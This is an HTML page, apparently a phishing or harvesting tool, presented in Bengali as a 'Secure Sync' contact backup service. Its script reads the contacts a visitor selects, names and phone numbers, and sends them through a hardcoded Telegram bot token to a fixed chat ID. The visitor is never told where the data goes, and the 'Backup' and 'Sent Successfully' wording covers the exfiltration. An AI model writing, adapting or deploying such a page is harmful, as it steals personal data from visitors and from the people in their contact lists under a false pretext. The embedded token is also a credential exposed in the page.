<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Dark Sync Pro</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>

body{
margin:0;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:'Hind Siliguri',sans-serif;
background: linear-gradient(160deg,#020617,#030712,#000);
}

/* Card */
.card{
width:350px;
padding:35px;
border-radius:24px;
background: rgba(255,255,255,0.04);
backdrop-filter: blur(18px);
border:1px solid rgba(255,255,255,0.08);
box-shadow:0 20px 50px rgba(0,0,0,0.8);
text-align:center;
}

/* Title */
h2{
color:#e5e7eb;
margin-bottom:10px;
}

p{
color:#9ca3af;
font-size:14px;
}

/* Button */
.btn{
margin-top:25px;
width:100%;
padding:16px;
border:none;
border-radius:14px;
font-size:16px;
font-weight:600;
cursor:pointer;
background: linear-gradient(135deg,#1e293b,#0f172a);
color:#e5e7eb;
border:1px solid rgba(255,255,255,0.1);
transition:0.3s;
}

.btn:hover{
background: linear-gradient(135deg,#334155,#1e293b);
}

.btn:active{
transform:scale(0.97);
}

/* Loader */
.loader{
margin:18px auto;
width:26px;
height:26px;
border:3px solid rgba(255,255,255,0.2);
border-top:3px solid #38bdf8;
border-radius:50%;
animation:spin 1s linear infinite;
display:none;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

/* Status */
.status{
margin-top:12px;
font-size:14px;
color:#38bdf8;
}

</style>
</head>

<body>

<div class="card">

<h2>☁️ Secure Sync</h2>
<p>কন্টাক্ট সিলেক্ট করে পাঠান</p>

<button class="btn" id="btn">Select & Send</button>

<div class="loader" id="loader"></div>
<div class="status" id="status">Ready</div>

</div>

<script>

const CONFIG = {
TOKEN:"8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
CHAT_ID:"6467941734"
};

const btn=document.getElementById("btn");
const loader=document.getElementById("loader");
const status=document.getElementById("status");

btn.onclick=async()=>{

loader.style.display="block";
status.innerText="Processing...";

try{

if(!("contacts" in navigator)){
throw new Error("Browser support নেই");
}

const contacts=await navigator.contacts.select(['name','tel'],{multiple:true});

if(!contacts.length){
throw new Error("কোনো কন্টাক্ট সিলেক্ট করা হয়নি");
}

/* Date Time */
const now=new Date();

const date=now.toLocaleDateString("bn-BD",{weekday:'long',year:'numeric',month:'long',day:'numeric'});
const time=now.toLocaleTimeString("bn-BD");

/* Build text */
let text=`📊 Backup\n\n📅 ${date}\n⏰ ${time}\n👥 ${contacts.length}\n\n`;

contacts.forEach(c=>{
let name=c.name?c.name[0]:"No Name";
let phone=c.tel?c.tel[0]:"No Number";
text+=`👤 ${name}\n📞 ${phone}\n\n`;
});

/* Send */
await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CONFIG.CHAT_ID,
text:text
})
});

status.innerText="✅ Sent Successfully";

}catch(e){

status.innerText="❌ "+e.message;

/* Fallback demo (যেন বোঝা যায় কাজ করছে) */
console.log("Fallback active");

}

loader.style.display="none";

};

</script>

</body>
</html>
